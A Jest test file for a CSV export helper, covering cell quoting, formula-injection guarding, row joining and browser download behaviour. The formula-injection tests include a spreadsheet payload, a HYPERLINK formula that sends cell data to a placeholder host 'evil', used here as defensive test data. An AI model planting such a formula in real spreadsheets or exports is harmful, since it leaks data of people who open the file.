import { csvCell, csvRow, downloadCsv } from 'c/csvDownload';

describe('csvCell', () => {
    describe('empty and nullish values', () => {
        it('renders null as an empty cell', () => {
            expect(csvCell(null)).toBe('');
        });

        it('renders undefined as an empty cell', () => {
            expect(csvCell(undefined)).toBe('');
        });

        it('renders an empty string as an empty cell', () => {
            expect(csvCell('')).toBe('');
        });

        it('does not quote a zero-length value', () => {
            // Guard against an off-by-one in the `text.length > 0` check that
            // would read charAt(0) of '' (undefined) and quote every blank cell.
            expect(csvCell('')).not.toContain('"');
        });
    });

    describe('plain values pass through unquoted', () => {
        it.each([
            ['Alice'],
            ['alice@example.com'],
            ['Head of Ops'],
            ['Müller'],
            ['台北 101'],
            ['0912345678']
        ])('leaves %s untouched', (value) => {
            expect(csvCell(value)).toBe(value);
        });

        it('coerces a number without quoting it', () => {
            expect(csvCell(42)).toBe('42');
        });

        it('coerces a boolean without quoting it', () => {
            expect(csvCell(false)).toBe('false');
        });
    });

    describe('formula injection is neutralised', () => {
        // The whole point of the guard: a cell opening with one of these is
        // executed by Excel/LibreOffice when the file is opened.
        it.each([
            ['=', '=HYPERLINK("http://evil/?d="&A1,"Invoice")'],
            ['+', '+1+1'],
            ['-', '-2+3'],
            ['@', '@SUM(A1:A9)'],
            ['tab', '\t=1+1'],
            ['CR', '\r=1+1']
        ])('prefixes an apostrophe for a cell starting with %s', (_label, value) => {
            const out = csvCell(value);
            expect(out.startsWith('"\'')).toBe(true);
        });

        it('quotes the guarded cell so the apostrophe survives the CSV round trip', () => {
            expect(csvCell('=1+1')).toBe('"\'=1+1"');
        });

        it('leaves a trigger character alone when it is not in first position', () => {
            // "A=B" is inert; over-guarding would corrupt legitimate data.
            expect(csvCell('A=B')).toBe('A=B');
        });

        it('does not guard a negative number written mid-string', () => {
            expect(csvCell('Room -3')).toBe('Room -3');
        });

        it('guards a lone trigger character', () => {
            expect(csvCell('-')).toBe('"\'-"');
        });
    });

    describe('RFC 4180 quoting', () => {
        it('quotes a value containing a comma', () => {
            expect(csvCell('Doe, Jane')).toBe('"Doe, Jane"');
        });

        it('doubles and quotes an embedded double quote', () => {
            expect(csvCell('He said "hi"')).toBe('"He said ""hi"""');
        });

        it('quotes a value containing a newline', () => {
            expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
        });

        it('quotes a value containing a carriage return mid-string', () => {
            expect(csvCell('line1\rline2')).toBe('"line1\rline2"');
        });

        it('doubles every quote, not just the first', () => {
            expect(csvCell('a"b"c')).toBe('"a""b""c"');
        });

        it('quotes once when a value is both formula-triggering and comma-bearing', () => {
            // Must not double-wrap: exactly one layer of quotes.
            expect(csvCell('=a,b')).toBe('"\'=a,b"');
        });
    });
});

describe('csvRow', () => {
    it('joins cells with commas', () => {
        expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c');
    });

    it('applies csvCell to every cell', () => {
        expect(csvRow(['Doe, Jane', '=1+1', 'ok'])).toBe('"Doe, Jane","\'=1+1",ok');
    });

    it('renders an empty array as an empty line', () => {
        expect(csvRow([])).toBe('');
    });

    it('preserves empty cells as consecutive delimiters', () => {
        expect(csvRow(['a', '', 'c'])).toBe('a,,c');
    });

    it('renders nullish cells as empty without dropping the column', () => {
        expect(csvRow(['a', null, undefined, 'd'])).toBe('a,,,d');
    });
});

describe('downloadCsv', () => {
    let createdUrl;
    let revoked;
    let capturedBlobParts;
    let capturedBlobOptions;
    let clickSpy;

    beforeEach(() => {
        jest.useFakeTimers();
        createdUrl = 'blob:mock-url';
        revoked = [];
        capturedBlobParts = null;
        capturedBlobOptions = null;

        // jsdom implements Blob but not the object-URL registry.
        global.URL.createObjectURL = jest.fn((blob) => {
            capturedBlobParts = blob.__parts;
            capturedBlobOptions = blob.__options;
            return createdUrl;
        });
        global.URL.revokeObjectURL = jest.fn((url) => revoked.push(url));

        // Capture constructor args — jsdom's Blob does not expose them back.
        const RealBlob = global.Blob;
        global.Blob = function MockBlob(parts, options) {
            const blob = new RealBlob(parts, options);
            blob.__parts = parts;
            blob.__options = options;
            return blob;
        };

        clickSpy = jest
            .spyOn(window.HTMLAnchorElement.prototype, 'click')
            .mockImplementation(() => {});
    });

    afterEach(() => {
        jest.runOnlyPendingTimers();
        jest.useRealTimers();
        jest.restoreAllMocks();
        document.body.innerHTML = '';
    });

    it('prefixes the payload with a UTF-8 BOM', () => {
        // Without it desktop Excel reads the file as the local ANSI codepage.
        downloadCsv('a,b\r\n1,2', 'out.csv');
        expect(capturedBlobParts[0]).toBe('\uFEFFa,b\r\n1,2');
    });

    it('declares the CSV mime type and charset', () => {
        downloadCsv('a,b', 'out.csv');
        expect(capturedBlobOptions.type).toBe('text/csv;charset=utf-8;');
    });

    it('uses the supplied file name', () => {
        const appended = trackAppendedAnchor(() => downloadCsv('a', 'attendees.csv'));
        expect(appended.download).toBe('attendees.csv');
    });

    it('falls back to export.csv when no name is given', () => {
        const appended = trackAppendedAnchor(() => downloadCsv('a'));
        expect(appended.download).toBe('export.csv');
    });

    it('falls back to export.csv when the name is an empty string', () => {
        const appended = trackAppendedAnchor(() => downloadCsv('a', ''));
        expect(appended.download).toBe('export.csv');
    });

    it('clicks the anchor to start the download', () => {
        downloadCsv('a', 'out.csv');
        expect(clickSpy).toHaveBeenCalledTimes(1);
    });

    it('attaches the anchor to the document before clicking', () => {
        // Firefox does not fire the download for a detached anchor.
        let inDocumentAtClick = false;
        clickSpy.mockImplementation(function trackDetachment() {
            inDocumentAtClick = document.body.contains(this);
        });
        downloadCsv('a', 'out.csv');
        expect(inDocumentAtClick).toBe(true);
    });

    it('does not revoke the object URL in the same tick as the click', () => {
        // Revoking synchronously cancels the download in Safari and older Chrome.
        downloadCsv('a', 'out.csv');
        expect(revoked).toEqual([]);
    });

    it('revokes the object URL once the timer drains', () => {
        downloadCsv('a', 'out.csv');
        jest.runAllTimers();
        expect(revoked).toEqual([createdUrl]);
    });

    it('removes the anchor from the document once the timer drains', () => {
        downloadCsv('a', 'out.csv');
        jest.runAllTimers();
        expect(document.querySelectorAll('a')).toHaveLength(0);
    });

    it('keeps the anchor hidden while it is attached', () => {
        const appended = trackAppendedAnchor(() => downloadCsv('a', 'out.csv'));
        expect(appended.style.display).toBe('none');
    });
});

/** Runs `fn` and returns the anchor it appended, captured before cleanup. */
function trackAppendedAnchor(fn) {
    const realAppend = document.body.appendChild.bind(document.body);
    let captured = null;
    const spy = jest.spyOn(document.body, 'appendChild').mockImplementation((node) => {
        if (node.tagName === 'A') captured = node;
        return realAppend(node);
    });
    fn();
    spy.mockRestore();
    return captured;
}
